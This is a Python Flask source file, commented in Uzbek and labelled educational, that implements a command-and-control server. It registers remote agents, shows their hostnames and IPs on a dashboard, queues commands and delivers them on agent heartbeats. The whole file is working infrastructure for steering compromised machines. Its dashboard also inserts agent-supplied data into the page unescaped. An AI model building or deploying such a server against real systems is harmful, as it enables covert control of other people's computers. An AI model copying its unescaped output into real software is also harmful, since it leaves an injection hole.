"""
C2 Platform Server
Flask yordamida yaratilgan Command & Control server
"""

from flask import Flask, request, jsonify, render_template_string
from flask_socketio import SocketIO, emit, join_room, leave_room
import json
import threading
import time
from datetime import datetime
import sys
import os

# Common modullarni import qilish
sys.path.append(os.path.join(os.path.dirname(__file__), '..'))
from common.config import *
from common.utils import *

app = Flask(__name__)
app.config['SECRET_KEY'] = SECRET_KEY
socketio = SocketIO(app, cors_allowed_origins="*")

# Global o'zgaruvchilar
connected_agents = {}
command_queue = {}
agent_history = {}


class C2Server:
    """C2 Server boshqaruv klassi"""
    
    def __init__(self):
        self.agents = {}
        self.active_sessions = {}
        
    def register_agent(self, agent_id: str, agent_info: dict):
        """Yangi agent ro'yxatdan o'tkazish"""
        self.agents[agent_id] = {
            'info': agent_info,
            'last_seen': datetime.now().isoformat(),
            'status': 'online',
            'commands_sent': 0,
            'commands_received': 0
        }
        log_message(f"Yangi agent ro'yxatdan o'tdi: {agent_id}")
        
    def update_agent_status(self, agent_id: str):
        """Agent statusini yangilash"""
        if agent_id in self.agents:
            self.agents[agent_id]['last_seen'] = datetime.now().isoformat()
            self.agents[agent_id]['status'] = 'online'
    
    def get_agent_list(self):
        """Barcha agentlar ro'yxatini olish"""
        return self.agents
    
    def send_command(self, agent_id: str, command: dict):
        """Agentga komanda yuborish"""
        if agent_id in self.agents:
            if agent_id not in command_queue:
                command_queue[agent_id] = []
            command_queue[agent_id].append(command)
            self.agents[agent_id]['commands_sent'] += 1
            return True
        return False


# Server instansiyasi
server = C2Server()


@app.route('/')
def dashboard():
    """Asosiy dashboard sahifasi"""
    html_template = '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>C2 Platform Dashboard</title>
        <meta charset="utf-8">
        <style>
            body { font-family: Arial, sans-serif; margin: 20px; background: #1a1a1a; color: #fff; }
            .container { max-width: 1200px; margin: 0 auto; }
            .header { background: #2d3748; padding: 20px; border-radius: 8px; margin-bottom: 20px; }
            .agents-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; }
            .agent-card { background: #2d3748; padding: 15px; border-radius: 8px; border-left: 4px solid #4CAF50; }
            .agent-offline { border-left-color: #f44336; }
            .status-online { color: #4CAF50; }
            .status-offline { color: #f44336; }
            .btn { background: #4CAF50; color: white; padding: 8px 16px; border: none; border-radius: 4px; cursor: pointer; }
            .btn:hover { background: #45a049; }
            .stats { display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px; margin: 20px 0; }
            .stat-card { background: #4a5568; padding: 15px; border-radius: 8px; text-align: center; }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <h1>🎯 C2 Platform Dashboard</h1>
                <p>Command & Control Server - Ta'lim maqsadida</p>
            </div>
            
            <div class="stats">
                <div class="stat-card">
                    <h3 id="total-agents">0</h3>
                    <p>Jami Agentlar</p>
                </div>
                <div class="stat-card">
                    <h3 id="online-agents">0</h3>
                    <p>Online Agentlar</p>
                </div>
                <div class="stat-card">
                    <h3 id="total-commands">0</h3>
                    <p>Yuborilgan Komandalar</p>
                </div>
                <div class="stat-card">
                    <h3 id="server-uptime">0</h3>
                    <p>Server Uptime</p>
                </div>
            </div>
            
            <h2>📱 Ulangan Agentlar</h2>
            <div id="agents-list" class="agents-grid">
                <div style="text-align: center; grid-column: 1/-1; color: #666;">
                    Hech qanday agent ulanmagan...
                </div>
            </div>
        </div>
        
        <script>
            function updateDashboard() {
                fetch('/api/agents')
                    .then(response => response.json())
                    .then(data => {
                        const agentsList = document.getElementById('agents-list');
                        const agents = data.agents;
                        
                        if (Object.keys(agents).length === 0) {
                            agentsList.innerHTML = '<div style="text-align: center; grid-column: 1/-1; color: #666;">Hech qanday agent ulanmagan...</div>';
                        } else {
                            let html = '';
                            Object.keys(agents).forEach(agentId => {
                                const agent = agents[agentId];
                                const isOnline = agent.status === 'online';
                                html += `
                                    <div class="agent-card ${isOnline ? '' : 'agent-offline'}">
                                        <h3>🖥️ ${agent.info.hostname}</h3>
                                        <p><strong>ID:</strong> ${agentId.substring(0, 8)}...</p>
                                        <p><strong>IP:</strong> ${agent.info.ip_address}</p>
                                        <p><strong>Platform:</strong> ${agent.info.platform}</p>
                                        <p><strong>Status:</strong> <span class="${isOnline ? 'status-online' : 'status-offline'}">${agent.status}</span></p>
                                        <p><strong>Oxirgi ko'rilgan:</strong> ${new Date(agent.last_seen).toLocaleString()}</p>
                                        <button class="btn" onclick="sendCommand('${agentId}', 'sysinfo')">System Info</button>
                                    </div>
                                `;
                            });
                            agentsList.innerHTML = html;
                        }
                        
                        // Statistikalarni yangilash
                        document.getElementById('total-agents').textContent = Object.keys(agents).length;
                        document.getElementById('online-agents').textContent = Object.values(agents).filter(a => a.status === 'online').length;
                    });
            }
            
            function sendCommand(agentId, command) {
                fetch('/api/command', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({agent_id: agentId, command: command})
                })
                .then(response => response.json())
                .then(data => {
                    alert(data.message);
                });
            }
            
            // Har 5 soniyada yangilash
            setInterval(updateDashboard, 5000);
            updateDashboard();
        </script>
    </body>
    </html>
    '''
    return render_template_string(html_template)


@app.route('/api/agents')
def get_agents():
    """Agentlar ro'yxatini API orqali olish"""
    return jsonify({
        'status': 'success',
        'agents': server.get_agent_list()
    })


@app.route('/api/command', methods=['POST'])
def send_command():
    """Agentga komanda yuborish API"""
    data = request.get_json()
    agent_id = data.get('agent_id')
    command = data.get('command')
    
    if not agent_id or not command:
        return jsonify({'status': 'error', 'message': 'Agent ID va command talab qilinadi'})
    
    command_data = {
        'type': command,
        'timestamp': datetime.now().isoformat(),
        'id': f"cmd_{int(time.time())}"
    }
    
    if server.send_command(agent_id, command_data):
        return jsonify({'status': 'success', 'message': 'Komanda yuborildi'})
    else:
        return jsonify({'status': 'error', 'message': 'Agent topilmadi'})


@app.route('/api/register', methods=['POST'])
def register_agent():
    """Agent ro'yxatdan o'tish API"""
    try:
        data = request.get_json()
        agent_id = data.get('agent_id')
        agent_info = data.get('agent_info', {})
        
        if not agent_id:
            return jsonify({'status': 'error', 'message': 'Agent ID talab qilinadi'})
        
        server.register_agent(agent_id, agent_info)
        
        return jsonify({
            'status': 'success', 
            'message': 'Agent muvaffaqiyatli ro\'yxatdan o\'tdi',
            'agent_id': agent_id
        })
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)})


@app.route('/api/heartbeat', methods=['POST'])
def heartbeat():
    """Agent heartbeat API"""
    try:
        data = request.get_json()
        agent_id = data.get('agent_id')
        
        if not agent_id:
            return jsonify({'status': 'error', 'message': 'Agent ID talab qilinadi'})
        
        server.update_agent_status(agent_id)
        
        # Navbatdagi komandalarni yuborish
        commands = command_queue.get(agent_id, [])
        command_queue[agent_id] = []  # Navbatni tozalash
        
        return jsonify({
            'status': 'success',
            'commands': commands,
            'timestamp': datetime.now().isoformat()
        })
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)})


if __name__ == '__main__':
    log_message("C2 Server ishga tushmoqda...")
    log_message(f"Dashboard: http://{SERVER_HOST}:{SERVER_PORT}")
    log_message("⚠️  Bu dastur faqat ta'lim maqsadida!")
    
    socketio.run(app, host=SERVER_HOST, port=SERVER_PORT, debug=False)